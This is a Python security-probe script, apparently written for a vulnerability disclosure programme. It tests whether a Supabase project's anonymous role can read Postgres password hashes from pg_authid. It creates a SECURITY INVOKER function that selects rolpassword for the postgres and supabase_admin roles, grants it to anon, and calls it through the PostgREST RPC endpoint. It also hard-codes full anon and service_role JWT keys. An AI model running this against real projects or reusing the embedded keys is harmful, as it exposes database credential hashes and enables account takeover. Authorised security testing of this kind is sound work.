# -*- coding: utf-8 -*-
"""DB 细测 F: anon 身份读 pg_authid 测试 (INVOKER 函数 + PostgREST RPC) - 验证 supautils hook 放行范围"""
import http.client, ssl, json, time, os, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _supabase_creds import BEARER_JWT, VDP_HEADERS, UA, API_HOST, PROJECT_REF

ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZuZm9iYnl3ZW1xZ2Nnam9ra3hkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODg1MDM2MjQsImV4cCI6MjEwNDA3OTYyNH0.DNQluKwykRJKoIRtWRd5AJCZTysTZEEGc3ooMZ6B_7Q"
SR_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZuZm9iYnl3ZW1xZ2Nnam9ra3hkIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc4ODUwMzYyNCwiZXhwIjoyMTA0MDc5NjI0fQ.Uq8457YU68HS3Xw9LFRyQIGQfxSNy9jXcVKdkKuucvE"
HOST = "vnfobbywemqgcgjokkxd.supabase.co"

ctx = ssl.create_default_context()
out = []
def q(sql, tag, maxb=30000):
    body = json.dumps({"query": sql})
    c = http.client.HTTPSConnection(API_HOST, timeout=30, context=ctx)
    h = {"User-Agent": UA, "Accept": "application/json", "Content-Type": "application/json",
         "Authorization": "Bearer " + BEARER_JWT}
    h.update(VDP_HEADERS)
    t0 = time.time()
    try:
        c.request('POST', '/v1/projects/%s/database/query' % PROJECT_REF, headers=h, body=body)
        r = c.getresponse()
        b = r.read(maxb).decode('utf-8', errors='replace')
        out.append('### [%s] (%.1fs)\n%s | %s' % (tag, time.time() - t0, r.status, b[:18000]))
        c.close()
    except Exception as e:
        out.append('### [%s] ERR %s' % (tag, e))

def svc(method, path, tag, key, body=None):
    body_j = json.dumps(body) if body is not None else None
    c = http.client.HTTPSConnection(HOST, timeout=20, context=ctx)
    h = {"User-Agent": UA, "Accept": "application/json", "apikey": key, "Authorization": "Bearer " + key}
    if body_j:
        h["Content-Type"] = "application/json"
    t0 = time.time()
    try:
        c.request(method, path, headers=h, body=body_j)
        r = c.getresponse()
        b = r.read(8000).decode('utf-8', errors='replace')
        out.append('### [%s] %s %s (%.1fs)\n%s | %s' % (tag, method, path, time.time() - t0, r.status, b[:2500]))
        c.close()
    except Exception as e:
        out.append('### [%s] ERR %s' % (tag, e))

# 1. anon 的 pg_authid ACL 位 (预期 false)
q("select has_table_privilege('anon', 'pg_authid', 'SELECT') anon_authid, has_table_privilege('anon', 'pg_roles', 'SELECT') anon_roles, has_table_privilege('authenticated', 'pg_authid', 'SELECT') au_authid;", "acl-bits")
# 2. 建 INVOKER 函数 (读 pg_authid) + grant anon
q("""create or replace function public.sbx_probe_authid()
returns table(rolname text, pw text)
language sql security invoker
as $$ select rolname, rolpassword from pg_authid where rolname in ('postgres','supabase_admin','supabase_auth_admin') $$;
grant execute on function public.sbx_probe_authid() to anon, authenticated;""", "mk-func")
# 3. anon key 调 RPC (决定性: hook 是否放行 anon)
svc('POST', '/rest/v1/rpc/sbx_probe_authid', 'rpc-anon', ANON_KEY)
# 4. service_role 调 RPC (对照: owner 面)
svc('POST', '/rest/v1/rpc/sbx_probe_authid', 'rpc-sr', SR_KEY)
# 5. 清理
q("drop function if exists public.sbx_probe_authid();", "clean-func")

open(os.path.join(os.path.dirname(os.path.abspath(__file__)), '_sb43_anon_authid.txt'), 'w', encoding='utf-8').write('\n'.join(out))
print('ttl=%ds' % (1788510807 - int(time.time())))
print('\n'.join(out)[:8000])
